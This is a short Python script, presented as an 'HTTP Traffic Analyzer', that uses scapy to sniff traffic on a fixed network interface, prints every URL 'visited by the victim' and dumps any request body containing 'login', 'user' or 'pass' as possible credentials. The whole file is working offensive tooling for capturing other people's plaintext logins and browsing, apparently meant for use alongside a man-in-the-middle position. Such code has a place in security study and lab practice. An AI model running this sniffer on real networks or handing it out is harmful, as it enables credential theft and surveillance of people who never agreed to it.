#!/usr/bin/env python3
"""
HTTP Traffic Analyzer.

This script analyzes HTTP traffic to detect URLs visited by clients and potential credentials sent over HTTP.

Usage:
  python3 http_analyzer.py

Example:
  python3 http_analyzer.py
"""

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal
import sys

def signal_handler(sig, frame):
    """
    Handles SIGINT signal (Ctrl+C) gracefully.
    Exits the program with an appropriate message.

    Args:
        sig: Signal number
        frame: Current stack frame
    """
    print(colored(f"\n[!] Ctrl + C pressed...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

def process_packet(packet):
    """
    Processes HTTP packets and extracts URLs and potential credentials.

    Args:
        packet (scapy.Packet): The HTTP packet to process.
    """
    cred_keywords = ["login", "user", "pass"]

    if packet.haslayer(http.HTTPRequest):
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(colored(f"[+] URL visited by the victim: {url}", 'blue'))

        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()
                for keyword in cred_keywords:
                    if keyword in response:
                        print(colored(f"\n[+] Possible credentials: {response}\n", 'green'))
                        break
            except:
                pass

def sniff(interface):
    """
    Sniffs HTTP traffic on the specified interface.

    Args:
        interface (str): The network interface to sniff on.
    """
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    """
    Main function to execute the HTTP traffic analysis.
    """
    sniff("ens33")

if __name__ == "__main__":
    main()
